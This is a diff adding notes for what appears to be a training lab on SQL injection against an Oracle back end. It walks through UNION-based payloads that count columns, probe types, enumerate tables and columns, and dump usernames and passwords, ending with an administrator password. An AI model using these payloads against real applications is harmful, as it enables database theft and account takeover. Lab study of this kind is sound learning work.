@@ -1,0 +1,48 @@
+ Lab #10 SQL injection attack, listing the database contents on Oracle
+
+ SQLi in -> Product Category filter.
+
+ End Goal--
+ 1. Determine which table contains username and passwords.
+ 
+ 2. Determine the column names in the table.
+
+ 3. Output the contents of the table.
+
+ 4. Login as Administrator.
+
+ ----------------------------------------------
+
+ Solution:-
+
+Steps:::
+1. Determine the number of columms. 
+    - Order by clause (' order by 1--)
+
+' order by 3-- => internal server error.  => 2 columms are present.
+
+2. Determine data types of the columms.
+
+' UNION SELECT NULL, NULL--
+' UNION SELECT 'a', 'a'-- ==> but we are using an Oracle table  ==> ' UNION SELECT 'a', 'a' From DUAL--
+    --> Both columms accepts type text. as we got '200ok' from our payload.
+
+3. Output the list of tables in the database.
+
+' UNION SELECT table_name, NULL FROM all_tables--
+
+    USERS_PHVZOH
+
+4. Output the column name of the users table.
+
+' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_PHVZOH'--
+
+    USERNAME_BHVXRI
+    PASSWORD_NBRNWH
+
+5. Output the list of username and passwords.
+
+' UNION SELECT USERNAME_BHVXRI, PASSWORD_NBRNWH from USERS_PHVZOH-- 
+
+    Administrator --> username
+    34dhugp0aunv9fsoubxb --> password
